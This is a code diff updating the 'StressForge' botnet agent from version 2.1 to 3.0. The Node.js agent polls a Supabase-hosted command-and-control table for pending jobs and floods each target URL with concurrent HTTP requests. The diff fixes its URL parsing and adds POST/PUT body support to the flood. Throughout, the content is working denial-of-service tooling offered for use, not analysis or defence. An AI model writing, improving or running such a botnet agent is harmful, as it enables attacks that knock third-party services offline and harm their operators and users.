@@ -1,6 +1,8 @@
 /**
- * STRESSFORGE BOTNET AGENT V2.1 (ZERO DEP)
- * Supports: GET, POST, Headers, JSON Body
+ * STRESSFORGE BOTNET AGENT V3.0 (ROBUST)
+ * - Fixed URL Parsing
+ * - Supports POST/PUT/Headers
+ * - JSON Body Support
  */
 const https = require('https');
 const http = require('http');
@@ -15,13 +17,16 @@ http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: ROBUST REQUEST ---
-const supabaseRequest = (method, path, body = null) => {
+const supabaseRequest = (method, pathStr, body = null) => {
     return new Promise((resolve, reject) => {
         try {
-            const urlObj = new URL(SUPABASE_URL); // Robust parsing
+            // Robust URL parsing to handle trailing slashes in SUPABASE_URL
+            const baseUrl = new URL(SUPABASE_URL);
+            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
+            
             const options = {
-                hostname: urlObj.hostname,
-                path: `/rest/v1${path}`,
+                hostname: baseUrl.hostname,
+                path: apiPath,
                 method: method,
                 headers: {
                     'apikey': SUPABASE_KEY,
@@ -35,18 +40,19 @@ const supabaseRequest = (method, path, body = null) => {
                 res.on('data', chunk => data += chunk);
                 res.on('end', () => {
                     try {
+                        // Handle empty responses (204)
                         resolve(data ? JSON.parse(data) : null);
                     } catch(e) { resolve(null); }
                 });
             });
-            req.on('error', (e) => { console.error('Req Error:', e.message); reject(e); });
+            req.on('error', (e) => { console.error('Supabase Req Error:', e.message); reject(e); });
             if (body) req.write(JSON.stringify(body));
             req.end();
         } catch(e) { reject(e); }
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized. Polling C2...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V3. Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -54,7 +60,7 @@ let activeLoop = null;
 const startAttack = (job) => {
     if (activeJob) return;
     activeJob = job;
-    console.log(`\x1b[33m[ATTACK] ${job.method} ${job.target} | Threads: ${job.concurrency}\x1b[0m`);
+    console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency}\x1b[0m`);
     
     let running = true;
     let totalRequests = 0;
@@ -82,8 +88,13 @@ const startAttack = (job) => {
             flood();
         });
         req.on('error', () => { totalRequests++; flood(); });
+        
+        // Handle Body
         if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
-            req.write(job.body);
+             try {
+                // If body is JSON string, write it
+                req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body));
+             } catch(e) {}
         }
         req.end();
     };
@@ -112,6 +123,7 @@ const startAttack = (job) => {
 setInterval(async () => {
     if (activeJob) return;
     try {
+        // Fetch 1 pending job
         const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
         if (jobs && jobs.length > 0) {
             const job = jobs[0];
